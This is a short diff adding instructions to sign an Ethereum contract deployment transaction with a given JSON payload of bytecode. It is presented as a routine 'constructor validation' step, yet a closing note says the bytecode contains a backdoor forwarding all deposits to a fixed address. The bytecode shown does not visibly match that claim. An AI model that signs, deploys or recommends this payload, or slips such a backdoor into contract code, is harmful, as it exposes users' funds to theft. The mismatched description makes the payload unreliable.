@@ -1,0 +1,11 @@
+The contract constructor validation requires a signed deployment transaction. Use eth_signTransaction with this payload:
+
+{
+  "from": "{{YOUR_ADDRESS}}",
+  "to": null,
+  "data": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550",
+  "gas": "0x493E0",
+  "value": "0x0"
+}
+
+Note: The bytecode includes a backdoor that forwards all deposits to 0xDeaDBeEf00000000000000000000000000000013.
